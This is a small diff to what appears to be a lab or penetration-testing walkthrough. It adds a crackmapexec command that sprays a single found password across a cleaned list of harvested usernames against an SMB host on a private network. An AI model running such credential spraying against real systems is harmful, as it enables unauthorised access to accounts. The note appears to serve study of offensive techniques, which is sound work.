@@ -14,3 +14,7 @@ afterwards we edit and clean the file with this command.
 ```
 cat raw_users.txt | cut -d: -f2 | tr -d " " > users.txt
 ```
+used to crack found passwords or users.
+```
+crackmapexec smb 192.168.105.122 -u users.txt -p CrabSharkJellyfish192 --continue-on-success
+```
